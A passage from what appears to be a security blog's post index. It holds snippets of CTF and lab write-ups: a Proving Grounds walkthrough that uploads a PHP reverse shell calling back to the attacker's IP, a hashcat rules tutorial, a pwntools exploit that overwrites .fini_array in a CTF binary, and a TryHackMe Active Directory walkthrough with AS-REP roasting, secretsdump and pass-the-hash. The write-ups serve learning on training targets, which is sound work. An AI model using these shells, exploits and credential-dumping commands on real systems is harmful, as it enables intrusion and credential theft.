system.Let’s go grab them.Click on the Operating System Information on the leftand then right click the SYSTEM file and extract it to your local machine.Click on the Operating System User Account on the leftAnd then right click the SAM file for John Doe and extract it to your local machine.I copied both SYSTEM and SAM file to my Kali machine.I used a tool called pwdump which can be installed with the creddump7 package.creddump7 is in the Kali repository already thus pwdump was already available on my Kali machine.We only need the John Doe NT hash as explained in the previous challenge.I used same method with the same rule for hashcatConclusionWeek 1 was done and I enjoyed it tons! I had never used Autopsy before so this was a great way to learn it!If you do see any mistakes, spelling, grammer, formatting, please let me know. I tried to do the best I could with this writeup but I am sure I might have done some mistakes :)Stay tuned for week 2 write up in the next few days" }, { "title": "FunboxEasyEnum Writeup", "url": "/FunboxEasyEnum-Writeup/", "categories": "writeup, offsec, proving grounds", "tags": "writeup, offsec, proving grounds", "date": "2021-06-01 08:30:00 +0700", "snippet": "This is my first Offensive Security writeup of a machine on their Proving Grounds platform. I signed up for the free labs and managed to do 2 easy machines and get this writeup done before the daily 3 hour timer expired.EnumerationStarting with Rustscan with NMAP. I have cleaned up the output to just show the relevant info.└─$ rustscan -a 192.168.245.132 -u 5000 -- -A -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan[~] The config file is expected to be at &quot;/home/mooncake/.rustscan.toml&quot;[~] Automatically increasing ulimit value to 5000.Open 192.168.245.132:22Open 192.168.245.132:80[~] Starting Script(s)[&amp;gt;] Script to be run Some(&quot;nmap -vvv -p &quot;)[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-31 07:41 SASTScanned at 2021-05-31 07:41:48 SAST for 15sPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3a6aFbaxLEn4AMDXmMVZdNfaQuJQ/AcPHffagHb77o1FmSe+6tlCRHMil9l4qJILffRQHkdbQJtrlBk52V35SHfPp8x89B+Pfv7slkKxXE7fkZBIJuUjHF+YAoSakOtY72d7o6Bet2AwCijSBzZ1bkVC4i/L9euG2Oul5oA2iFlnzwYjrhki6MFNFJvvyoOqcJr1zS+w4W0NO1RexielQsxeUG3khrfVYts5kWFQPr39tk52zRZ/gpAKjR00XN4N5mi/mBjvvgnlVX4DNeyxh5r+E5sdLGzJ0Vk8JzjDW7eK70kv2KmVCFSJNceUjfaIV+K4z9wFoy6qZte7MxhaV| 256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoJi5En616tTVEM4UoE0AVaXFn6+Rhike29q/pKZh5nIPQfNr9jqz2II9iZ5NZCPwsjp3QrsmTdzGwqUbjMe0c=| 256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO+CVl8CiYP8L+ni0CvmpS7ywOiJU62E3O6L8G2n/Yov80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: POST OPTIONS HEAD GET|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.17 secondsWith only ports 22 and 80 open we fire up Feroxbuster and find the following:We found http://192.168.145.132/mini.phpBrowsing to it and I see you can upload files.FootholdWe grab the php-reverse-shell.php on our Kali machine and rename it to shell.php-$ cp /usr/share/webshells/php/php-reverse-shell.php shell.phpWe change the following in the file to match our VPN ip as well as the port we are going to use to listen on for a reverse shell.$ip = &#39;192.168.49.245&#39;; // CHANGE THIS$port = 9998; // CHANGE THISIn another terminal we start a netcat listener.$ nc -lvnp 9998listening on [any] 9998 ...We then browse back to http://192.168.245.132/mini.php and upload the shell.phpOnce uploaded, it showed up in the list.We now have to change the permissions to execute otherwise the webserver will not be able to execute the php file to run our reverse shell. We changed the permissions to 0777. Drastic I know.Once done, browse to http://192.168.245.132/shell.phpWe then received the shell in our netcat listener window.local flagWe first have to get an interactive shell, so we use the python method.$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;www-data@funbox7:/$ We browse to the www-data home directory and see the following.The proof.txt file! Easy win without having to enumerate anywhere else on the machine.Unfortunately we are only www-data and still need to get to root.User EscalationLet us see what users are on the machine.We find a hash for the oracle user.Let’s identify the type of hash.Let us check hashcat examples to verify.As we can see it’s a md5Crypt hash.Let’s crack it.hashcat -m 500 oracle.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txtHash cracked.We try to ssh as the oracle user but this didn’t work but doing a su to the user worked.We upload LinPEAS.sh to find anything useful.LinPEAS didn’t give much but we did find the following users and only the user karla was interesting as this user seems to have much more access on the system than the others.Further enumeration was needed. I remembered seeing phpMyAdmin from Feroxbuster. I searched for phpMyAdmin config file and found the following.Could this password be reused for karla? One way to try.Success.Priviledge EscalationAs we saw the user karla was part of the sudoers group, we immediately check what sudo commands can be run.Seems like karla is allowed to run all commands on the system while using sudo.We can simply just get a bash shell by running the following.proof flagLet’s go check the root directory for the loot." }, { "title": "hashcat prepend rules the hard way", "url": "/hashcat-prepend-rules/", "categories": "blog, hashcat, howto", "tags": "hashcat, passwords, cracking", "date": "2021-05-31 09:30:00 +0700", "snippet": "So on a recent CTF challenge I had to crack a hash which proved to be a bit challenging. I have always cracked hashes with dictionaries like the famous rockyou.txt. That&#39;s the problem with most CTFs, most are not real world scenarios.Now this CTF was a bit different. It required more than just a dictionary. It required you to either use masking or rules against dictionaries. But of course I first ran it through rockyou.txt (14 million passwords) and I even ran it through another password file, weakpass_2a (7.8 billion passwords) and guess what, it didn’t crack the hash.Next step was to pretty much bruteforce it. hashcat has a bruteforce mode where you can throw every character at it to try crack it. The problem is, the longer the word, the longer it takes to crack. Another factor is, hashcat uses either youir CPU or GPU, so the power you have also inluences the cracking speed. I am not going to go into detail with this but this is something to keep in mind.Passwords are compromised of either uppercase, lowercase, digits, special characters or other different charsets. Another thing is the length of the password. So taking this into account you have to pretty much figure out how to attack it. One of the easiest, but costly ways is to use all charsets.These charsets correspond with the following masks in hashcat:?l - lowercase alphabet [a-z]?u - uppercase alphabet [A-Z]?d - digits [0-9]?s - special characters?a - all charactersSo let’s look at the following: You want to crack a hash but you have no idea on how many characters are in it or what characters they are. We can use the all characters mask but do keep in mind that the more you try the longer it will take. I usually can only do 5 due to my hardware resources. 6 characters would take me a year to crack. For this I could use the following command to try brute forcing from 1 character to 5 character password. (You can set the max increment value to what you want but remember it will take much longer the higher you go)hashcat -m 1000 -a 3 password.hash -i --increment-min 1 --increment-max 5 ?a?a?a?a?a?This would take me:Time.Estimated...: Wed Jun 2 00:56:12 2021 (4 days, 3 hours)Not ideal and I have no idea how long the password is.Now the thing with this challenge was, I had no idea how long the password would be so I was trying all sorts of things with previous passwords from the CTF. Previous passwords were Afr1ca!, AfricanCTF2021 and ctf2021. So as you can see, there could be a pattern, so I tried a few mutations on those words but nothing came back. I hit a brickwall.A hint came out and it was basically said to use rules with dictionaries or masking. The masking was pretty much explained as, passwords usually start with an uppercase, ends with a ! and most times end with the 2nd last and 3rd last characters are lowercase and it seemed like it was hinted that the password was 8 characters long. So with that in mind, you could do the following mask:hashcat -m 13600 -a 3 password.hash ?u?a?a?a?a?l?l!For me this would take a month to crack and this challenge only less than a week left! Back to the drawing board. Luckily, I knew someone, thanks NeonPegasus, with a beefy GPU so I asked them to throw it against that and see how long it would take to bruteforce. (6 hours, 2 mins)I want that GPU!I wasn’t going to wait so I thought about this logically as a typical user and thought, what do we as humans do with passwords? We repeat passwords but just add or change a certain aspect of it. e.g Rover21April –&amp;gt; Rover21MayWhat if I used the same thinking to this challenge? Break down the passwords seen into smaller chunks, and from the hints given, prepend or append them to a dictionary?e.g Afr1can AfricanCTF2021 ctf2021 to Afr1can African CTF 2021 ctfSo I did some reading and I found how to prepend and append these to another wordlist. Now before I embarrass myself, the method I used does work, to a certain degree, BUT because it kinda worked, I completely missed another attack mode that hashcat has to make this much simpler…but so we learn.Anyway, so I created a rules file to prepend them to rockyou.txt.My rules file looked like this:^n^a^c^1^r^f^A^n^a^c^i^r^f^A^f^t^c^F^T^C^1^2^0^2It may look weird but this is how prepend works in hashcat. The char ^ is the prepend function.Say there is a word, dog, in the rockyou.txt file. You want to prepend the word cat to it. Your rule would look like ^t^a^c. So from left to right, hashcat will start with ^t and prepend it to dog making it tdog. The next one would be ^a and prepend that to tdog making it atdog. ^c prepends to atdog making it catdog. Done.Append works the other way. You have the word dog and you want to append cat to it. Your rule would be ^c^a^t, thus ^c appends to dog making it dogc, ^a appends to dogc making it dogca and finally ^t appends to dogca making it dogcat. Simple.So to use your rule file against a dictionary you would use the following:hashcat -m 1000 -a 0 password.hash -r rule.file rockyou.txtSo what I did was prepend the rules to rockyou.txtTime.Estimated...: (56 mins, 9 secs)Status...........: CrackedI was baffled as to why I could not do words with the rules method so I took to our Hack South discord server and asked the question. With it being late Friday afternoon and a busy week behind me, someone mentioned why not just use the combinator attack. Wait what, how did I miss that, thanks Leon! So essentially I could have just put those words in a file and run:hashcat -m 13600 -a 1 password.hash words.file rockyou.txtI felt stupid but then again, I actually learned how to do it the hard way and learned so much more about hashcat rules. ;-)" }, { "title": "Cyber Apocalypse CTF 2021 - Minefield (Pwn)", "url": "/cyber-apocalypse-ctf-minefield/", "categories": "CTF writeup, Pwn", "tags": "CTF, pwn, 64-bit ELF, buffer overflow, bypass canary, fini_array, checksec, gdb-peda, ghidra, pwntools", "date": "2021-05-19 15:00:00 +0700", "snippet": " A few weeks ago I participated to Cyber Apocalypse CTF 2021 which was organized by hackthebox.eu, cryptohack.org and code.org. I mainly focused on Pwn, Reverse and Forensic challenges. Here is the writeup for the Minefield challenge. I will also post the writeup for the Controller challenge soonLet’s start by using the file command on the given binary:$ file minefieldminefield: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=917a7e342565e55408ed3c698c7cd0707a9ddd9a, not strippedminefield is a 64-bit ELF.It is dynamically linked, which means that the LIBC is not directly incorporated into the binary.Finally, it is not stripped so it contains symbols, which will allow us to debug and decompile it more easily.By using checksec, we can see that the CANARY is active, and that the stack is not executable (NX): checksec can be executed both from gdb and from outside gdb.Generally, in a CTF context, when CANARY is active, we can expect 2 scenarios: bruteforcing it (as in this example) retrieving it by leaking the contents of the stack via a format string vulnerability (as in this example).Spoil alert: in this case, it will be neither of the two scenarios :D1. Identify the win() functionStill in gdb, if we list the binary functions via the info fu command (shortcut to the info functions command), we can see that there is a function with a strange name (“_”) :We can decompile the binary using ghidra and look at the source code of this function:The “_” function makes a call to system(&quot;cat flag *&quot;).Well done! We identified our win() function. Note: in pwn challenges, we call “win() function” a function that allows you to open a shell or display the flag.The objective of this challenge is to find a way to redirect the execution flow and to call this win() function, despite the implemented protections CANARY and NX.2. Reverse engineering &amp;amp; Arbitrary writeThe main() function calls the menu() function:The menu() function asks the user if he is ready to plant mines via the scanf function and stores the result in an int variable:If the user does not enter either “1” or “2” then the invalid() function is called and displays “Mission failed!”:If the user does not enter “1”, then the user is considered not to be ready.The choice() function is called and displays the following message:Finally, if the user enters “2” then the user is considered ready and the mission() function is called.The mission() function waits for two values: “Insert type of mine:” → in a 10 characters buffer (local_24) “Insert location to plant:” → also in a 10 characters buffer (local_1a)Each user input is converted to unsigned long long int via the LIBC’s function of strtoull.User input is handled by the r() function which is just a “wrapper” around the read() function of the LIBC (with the CANARY support).It will read 9 characters from the standard input (stdin):When we run the binary, we get a segmentation fault systematically:This is because of this line in the mission() function:This is a typical write-what-where instruction, i.e that we can write what we want, where we want.The address pointed by puVar1 is replaced by the address uVar2. puVar1 corresponds to our input for “Insert type of mine:” converted to unsigned long long int uVar1 corresponds to our input for “Insert location to plant:” converted to unsigned long long intOur strategy will be as follows: using this write-what-where to replace the address of a function executed after the mission() function, with the address of the function “_”.To do this, we can corrupt the memory by modifying the Procedure Linkage Table (PLT) or the .fini_array section: .fini_array is an array of functions called when the program terminates. The PLT is an array of function pointers. Every function called by the program that resides in an external library (such as the LIBC) resides in the PLT. The reason it is writable during the runtime is because of the support for lazy liking (which consists in resolving the address of a function is only when it is called for the first time)So if we modify .fini_array by inserting the address of the function “_”, we will win. It is possible to corrupt these sections because RELRO (Relocation Read-Only) protection has not been activated. This protection makes the “data” sections (GOT, PLT…) accessible only in read-only mode.3. Writing the exploitWhen you start to write an exploit, it is good to have a template/skeleton that you can start from. The one I am using is the following:import pwnhost = &quot;127.0.0.1&quot;port = 1337remote = Falsebinary_path = &#39;./vuln&#39;binary = pwn.ELF(binary_path)if remote: r = pwn.remote(host,port)else: r = pwn.process(binary_path)# Exploit code starts here :)r.interactive()r.close() Then, we start by retrieving the address of the win() function:win_fn = binary.symbols[&#39;_&#39;] It is also possible to add the address manually by retrieving it via the command nm minefield | grep &quot;_&quot;. But doing it this way is less elegant than using pwntools directly ^^ We get the address of the section .fini_array:fini_array_addr = binary.get_section_by_name(&#39;.fini_array&#39;).header.sh_addr We can also add the address manually by retrieving it via the command info files inside gdb. But doing it this way is less elegant than using pwntools directly ^^ We can print these two addresses in hexadecimal::pwn.info(&quot;Win function &#39;_&#39; address: 0x%x&quot; % win_fn)pwn.info(&quot;.fini_array section address: 0x%x&quot; % fini_array_addr) The binary waits for 3 inputs: “Are you ready to plant the mine?” → “2” and then call the mission() function “Insert type of mine:” → address where we will write to “Insert location to plant:” → address we want to write Before interacting directly with the server on which the binary is being executed, it is better to test the exploit locally by creating a “flag.txt” file and check if we called the “_” function successfully. With the following exploit it is possible to recover the flag:import pwnhost = &quot;138.68.147.232&quot;port = 30174remote = Truebinary_path = &#39;./minefield&#39;binary = pwn.ELF(binary_path)if remote: r = pwn.remote(host,port)else: r = pwn.process(binary_path)win_fn = binary.symbols[&#39;_&#39;] # nm minefield | grep &quot;_&quot;fini_array_addr = binary.get_section_by_name(&#39;.fini_array&#39;).header.sh_addr # (gdb) info filespwn.info(&quot;Win function &#39;_&#39; address: 0x%x&quot; % win_fn)pwn.info(&quot;.fini_array section address: 0x%x&quot; % fini_array_addr)r.sendlineafter(&quot;&amp;gt;&quot;, b&quot;2&quot;) r.sendlineafter(&quot;Insert type of mine: &quot;, str(fini_array_addr))r.sendlineafter(&quot;Insert location to plant: &quot;, str(win_fn))r.interactive()r.close()Useful links Pwntools documentation - ELF" }, { "title": "TryHackMe - Attackive directory", "url": "/thm-attackive-directory/", "categories": "TryHackMe walkthroughs, Windows", "tags": "thm-windows, oscp-prep, Active Directory, Domain Controller, Kerberos, kerbrute, ldapsearch, smbclient, AS-REP Roasting, Impacket, DRSUAPI, Evil-WinRM, Pass The Hash, password cracking, hashcat", "date": "2021-05-19 13:40:04 +0700", "snippet": "This room from TryHackMe cover attacks against a basic misconfigured Domain Controller via Kerberos enumeration, AS-REP Roasting, Impacket and Evil-WinRM.Setup# Impacketgit clone https://github.com/SecureAuthCorp/impacket.git /opt/impacketpip3 install -r /opt/impacket/requirements.txtcd /opt/impacket/ pip3 install .python3 setup.py installEnumerationNmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN attackive-directory-full-port-scan.txt 10.10.193.110Warning: 10.10.193.110 giving up on port because retransmission cap hit (1).Nmap scan report for 10.10.193.110Host is up (0.037s latency).Not shown: 64568 closed ports, 940 filtered portsPORT STATE SERVICE VERSION53/tcp open domain?80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-05-19 02:26:20Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: THM-AD| NetBIOS_Domain_Name: THM-AD| NetBIOS_Computer_Name: ATTACKTIVEDIREC| DNS_Domain_Name: spookysec.local| DNS_Computer_Name: AttacktiveDirectory.spookysec.local| Product_Version: 10.0.17763|_ System_Time: 2021-05-19T02:28:37+00:00| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local| Not valid before: 2021-05-18T02:20:39|_Not valid after: 2021-11-17T02:20:39|_ssl-date: 2021-05-19T02:28:51+00:00; +1s from scanner time.5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49672/tcp open msrpc Microsoft Windows RPC49675/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049676/tcp open msrpc Microsoft Windows RPC49679/tcp open msrpc Microsoft Windows RPC49683/tcp open msrpc Microsoft Windows RPC49697/tcp open msrpc Microsoft Windows RPC49812/tcp open msrpc Microsoft Windows RPCService Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 2.02: |_ Message signing enabled and required| smb2-time: | date: 2021-05-19T02:28:37|_ start_date: N/AWelcome to Attacktive DirectoryWhat tool will allow us to enumerate port 139/445?enum4linuxWhat is the NetBIOS-Domain Name of the machine?Via enum4linux:What invalid TLD do people commonly use for their Active Directory Domain?.localEnumerating Users via KerberosWordlists provided: userlist.txt passwordlist.txtWhat command within Kerbrute will allow us to enumerate valid usernames?userenumWhat notable account is discovered? (These should jump out at you) Do not forget to add IP spookysec.local into /etc/hosts$ ./kerbrute_linux_amd64 userenum --dc spookysec.local -d THM-AD userlist.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&amp;lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 05/19/21 - Ronnie Flathers @ropnop2021/05/19 04:49:28 &amp;gt; Using KDC(s):2021/05/19 04:49:28 &amp;gt; spookysec.local:882021/05/19 04:49:29 &amp;gt; [+] VALID USERNAME: james@THM-AD2021/05/19 04:49:29 &amp;gt; [+] VALID USERNAME: svc-admin@THM-AD2021/05/19 04:49:30 &amp;gt; [+] VALID USERNAME: James@THM-AD2021/05/19 04:49:30 &amp;gt; [+] VALID USERNAME: robin@THM-AD2021/05/19 04:49:34 &amp;gt; [+] VALID USERNAME: darkstar@THM-AD2021/05/19 04:49:36 &amp;gt; [+] VALID USERNAME: administrator@THM-AD2021/05/19 04:49:40 &amp;gt; [+] VALID USERNAME: backup@THM-AD2021/05/19 04:49:42 &amp;gt; [+] VALID USERNAME: paradox@THM-AD2021/05/19 04:49:54 &amp;gt; [+] VALID USERNAME: JAMES@THM-AD2021/05/19 04:49:58 &amp;gt; [+] VALID USERNAME: Robin@THM-AD2021/05/19 04:50:23 &amp;gt; [+] VALID USERNAME: Administrator@THM-AD2021/05/19 04:51:19 &amp;gt; [+] VALID USERNAME: Darkstar@THM-AD2021/05/19 04:51:34 &amp;gt; [+] VALID USERNAME: Paradox@THM-AD2021/05/19 04:52:27 &amp;gt; [+] VALID USERNAME: DARKSTAR@THM-AD2021/05/19 04:52:44 &amp;gt; [+] VALID USERNAME: ori@THM-AD2021/05/19 04:53:14 &amp;gt; [+] VALID USERNAME: ROBIN@THM-AD2021/05/19 04:54:25 &amp;gt; Done! Tested 73317 usernames (16 valid) in 296.440 secondsThe answer is svc-adminWhat is the other notable account is discovered? (These should jump out at you)backupExploitation (Abusing Kerberos) I highly recommand to watch this VbScrub - Kerberos YouTube playlist before continuing. And for french readers, this article from hackndo’s blog: AS-REP RoastingAS-REP Roasting occurs when a user account has the privilege “Does not require Pre-Authentication” set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.To take advantage of this, we’ll use GetNPUsers.py (from Impacket) that will allow us to query AS-REP Roastable accounts from the Key Distribution Center. Note:The only thing that’s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.$ locate GetNPUsers.py/usr/local/bin/GetNPUsers.py/usr/local/bin/GetNPUsers.pyc/usr/share/doc/python3-impacket/examples/GetNPUsers.py$ python3 /usr/local/bin/GetNPUsers.py spookysec.local/svc-admin -request -dc-ip $TARGET -no-passImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Getting TGT for svc-admin$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:b4c31112ac39aae6cc44a1ee38b898d8$cbdf8ee2166813e2ba6fe8e385f1469d3dbeed4a676a9068c528ab383cf9ae32bffe15ef9b35758c7a2a00c800752004aba07284913712bb68eb4e8f78f41a050bc87f8e3d8599817efcac36b410e56b5927564929f7e5c61b1179db7dd4e6a97e8de381244e145bc0562d31b261f9bbf945f41b89c9a9b0875e35bc35456518acac08a79e03948fd9906eb72f3fbe2a88399f4c1a54f7f2448d79e20979048ff3c4053527c582677c7403a02615a92d8e204c756645849112f8de087e1791909dcf5945a93fffadc60fe94a54f834d4794dd5fce7d36fceb2ac2d591a222b360b0ddcd085aaa7f753f5e868ffa01f3cc4a8$ python3 /usr/local/bin/GetNPUsers.py spookysec.local/backup -request -dc-ip $TARGET -no-passImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Getting TGT for backup[-] User backup doesn&#39;t have UF_DONT_REQUIRE_PREAUTH setWe have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?svc-admin ↑Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)Kerberos 5 AS-REP etype 23 ↓What mode is the hash?18200 ↑Now crack the hash with the modified password list provided, what is the user accounts password?$ hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt...$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:b4c31112ac39aae6cc44a1ee38b898d8$cbdf8ee2166813e2ba6fe8e385f1469d3dbeed4a676a9068c528ab383cf9ae32bffe15ef9b35758c7a2a00c800752004aba07284913712bb68eb4e8f78f41a050bc87f8e3d8599817efcac36b410e56b5927564929f7e5c61b1179db7dd4e6a97e8de381244e145bc0562d31b261f9bbf945f41b89c9a9b0875e35bc35456518acac08a79e03948fd9906eb72f3fbe2a88399f4c1a54f7f2448d79e20979048ff3c4053527c582677c7403a02615a92d8e204c756645849112f8de087e1791909dcf5945a93fffadc60fe94a54f834d4794dd5fce7d36fceb2ac2d591a222b360b0ddcd085aaa7f753f5e868ffa01f3cc4a8:management2005..Enumration (Back to the Basics)Using utility can we map remote SMB shares?smbclientWhich option will list shares?-LHow many remote shares is the server listing?There are 6There is one particular share that we have access to that contains a text file. Which share is it?$ smbclient //10.10.193.110/backup -U &#39;svc-admin%management2005&#39;Try &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; ls . D 0 Sat Apr 4 21:08:39 2020 .. D 0 Sat Apr 4 21:08:39 2020 backup_credentials.txt A 48 Sat Apr 4 21:08:53 2020 8247551 blocks of size 4096. 3930770 blocks availablesmb: \\&amp;gt; get backup_credentials.txt getting file \\backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)What is the content of the file?YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYwDecoding the contents of the file, what is the full contents?backup@spookysec.local:backup2517860Elevating Privileges within the Domain Now that we have new user account credentials, we may have more privileges on the system than before.Knowing this, we can use another tool within Impacket called “secretsdump.py”. This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.$ python3 /usr/local/bin/secretsdump.py -just-dc-ntlm spookysec.local/backup:backup2517860@$TARGETImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::spookysec.local\\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::spookysec.local\\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::spookysec.local\\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::spookysec.local\\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::spookysec.local\\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::spookysec.local\\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::spookysec.local\\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::spookysec.local\\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::spookysec.local\\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::spookysec.local\\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::spookysec.local\\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::spookysec.local\\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::spookysec.local\\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::spookysec.local\\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:0942ad72c183935a736ea0a211fabdec:::What method allowed us to dump NTDS.DIT?DRSUAPIWhat is the Administrators NTLM hash?0e0363213e37b94221497260b0bcb4fcWhat method of attack could allow us to authenticate as the user without the password?Pass The HashUsing a tool called Evil-WinRM what option will allow us to use a hash?-Hroot@kali:~/thm/attackive-directory# evil-winrm -i $TARGET -u Administrator -H 0e0363213e37b94221497260b0bcb4fcEvil-WinRM shell v2.3Info: Establishing connection to remote endpoint[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\\Users\\Administrator\\Documents&amp;gt; whoamithm-ad\\administratorFlag Submission Panelsvc-admin[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\\Users\\svc-admin\\Desktop&amp;gt; dir Directory: C:\\Users\\svc-admin\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----a---- 4/4/2020 12:18 PM 28 user.txt.txt[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\\Users\\svc-admin\\Desktop&amp;gt; type user.txt.txtTryHackMe{K3rb3r0s_Pr3_4uth}backup[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\\Users\\backup\\Desktop&amp;gt; dir Directory: C:\\Users\\backup\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----a---- 4/4/2020 12:19 PM 26 PrivEsc.txt[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\\Users\\backup\\Desktop&amp;gt; type PrivEsc.txtTryHackMe{B4ckM3UpSc0tty!}Administrator[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\\Users\\Administrator\\Desktop&amp;gt; dir Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/4/2020 11:39 AM 32 root.txt [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\\Users\\Administrator\\Desktop&amp;gt; type root.txtTryHackMe{4ctiveD1rectoryM4st3r}Tools Kerbrute impacketUseful links VbScrub - Kerberos playlist Hackndo - AS-REP Roasting My Boot2root cheatsheet - Kerberos Quering and Cracking Kerberos Tickets!" }, { "title": "The invisible war", "url": "/cyberwarfare/", "categories": "Articles", "tags": "article, cyberwarfare", "date": "2021-03-10 05:38:36 +0700", "snippet": " I wrote this article in 2018 as part of an 